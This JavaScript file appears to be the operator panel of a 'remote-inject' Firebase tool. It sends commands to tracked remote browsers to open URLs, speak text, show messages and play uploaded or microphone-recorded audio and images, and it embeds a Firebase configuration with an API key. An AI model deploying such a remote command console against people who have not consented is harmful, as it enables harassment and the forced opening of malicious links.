const firebaseConfig = {
    apiKey: "AIzaSyBo2XACbM2X2YdEpGnxv8CL-kMSeMtjUBk",
    authDomain: "remote-inject.firebaseapp.com",
    projectId: "remote-inject",
    storageBucket: "remote-inject.appspot.com",
    messagingSenderId: "876245411694",
    appId: "1:876245411694:web:d6b8165ada4c661a25837f",
    measurementId: "G-76CQK0K24J"
};
firebase.initializeApp(firebaseConfig);
firebase.analytics();
var db = firebase.database()
var storage = firebase.storage()

function makeid(length) {
    var result           = [];
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result.push(characters.charAt(Math.floor(Math.random() * charactersLength)));
    }
   return result.join('');
}

function sendAction(value, callback){
    for (const tracker of trackers) {
        if(tracker.active){
            db.ref("/trackers/" + tracker.id).set(value).then(() => {
                if(typeof callback == "function"){
                    callback()
                }
            }) 
        }
    }
}
$("#exec-link").click(function(){
    sendAction({
        type: "link",
        url: $("#url").val(),
        openInNewWindow: ($("#newwindow").is(':checked')),
        timestamp: Date.now()
    }, () => {
        $("#url").val("")
    })
})
$("#exec-read").click(function(){
    sendAction({
        type: "tts",
        text: $("#readme").val(),
        timestamp: Date.now()
    }, () => {
        $("#readme").val("")
    })
})
$("#exec-message").click(function(){
    sendAction({
        type: "message",
        title: $("#mTitle").val(),
        body: $("#mBody").val(),
        timestamp: Date.now()
    }, () => {
        $("#mTitle").val("")
        $("#mBody").val("")
    })
})

function sendFileAction(type){
    const validImg = ['image/gif', 'image/jpeg', 'image/png', 'image/svg']
    const validAud = ['audio/ogg', 'audio/wav', "audio/mp3", "audio/wma", "audio/mpeg"]

    let fltype = document.getElementById(type + "file").files[0]['type']
    console.log(fltype)
    let flsize = document.getElementById(type + "file").files[0]['size'] / 1024 / 1024

    if(type == "image" && !validImg.includes(fltype)){alert("Sorry, that file type is not supported. Try a .png, .jpeg, .svg or .gif file"); return}
    if(type == "audio" && !validAud.includes(fltype)) {alert("Sorry, that file type is not supported. Try a .mp3, .wav, .wma, .mpeg, or .ogg file."); return}
    if(flsize > 3){alert("File too large. Try something below 3 mb."); return}
    let btn = document.getElementById("exec-" + type)
    btn.disabled = true
    let id = makeid(10)
    let file = document.getElementById(type + "file").files[0]
    let storageref = storage.ref(id + "_" + file.name)
    storageref.put(file).then((snap) => {
        sendAction({
            type: type,
            ref: id + "_" + file.name,
            timestamp: Date.now()
        }, () => {
            $(`#${type}file`).val("")
            btn.disabled = false
        })
    })
}
$("#exec-image").click(function() {
    sendFileAction("image")
})
$("#exec-audio").click(function() {
    sendFileAction("audio")
})

$("#rec-init").click(function() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        $("#rec-init").hide()
        document.getElementById("rec-start").disabled = false
        $("#rec-stop").addClass("btn-danger").removeClass("btn-default")
        console.log('getUserMedia supported.')
        let action = "stop"
        let status = "stopped"
        let chunks = []
        navigator.mediaDevices.getUserMedia (
        {
                audio: true
        })
        .then(function(stream) {
                const recorder = new MediaRecorder(stream)
                $("#rec-start").click(function() {
                    if(status == "stopped"){
                        status = "playing"
                        recorder.start()
                        $("#rec-start").text("Stop & Send").addClass("btn-primary").removeClass("btn-default")
                        document.getElementById("rec-stop").disabled = false
                    } else{
                        action = "send"
                        status = "stopped"
                        recorder.stop()
                        $("#rec-start").text("Start Recording").addClass("btn-default").removeClass("btn-primary")
                        document.getElementById("rec-stop").disabled = true
                    }
                })
                $("#rec-stop").click(function() {
                    action = "stop"
                    status = "stopped"
                    recorder.stop()
                    $("#rec-start").text("Start Recording").addClass("btn-default").removeClass("btn-primary")
                    document.getElementById("rec-stop").disabled = true
                })
                recorder.onstop = function(event){
                    if(action == "stop"){
                        chunks = []    
                        return
                    }
                
                    const blob = new Blob(chunks, { 'type' : 'audio/ogg; codecs=opus' });
                    const id = makeid(10)
                    blob.lastModifiedDate = new Date()
                    blob.name = id
                    storage.ref(id + ".ogg").put(blob).then((snap) => {
                        sendAction({
                            type: "audio",
                            ref: id + ".ogg",
                            timestamp: Date.now()
                        }, () => {
                            return
                        })
                    })
                    chunks = []
                }
                recorder.ondataavailable = function(event){
                    chunks.push(event.data)
                }
                $("#exec-rec").click(function() {
                    sendFileAction("rec")
                })
        })
        .catch(function(err) {
                console.log('The following getUserMedia error occurred: ' + err);
        }
        )
    } else {
        console.log('getUserMedia not supported on your browser!');
    }
})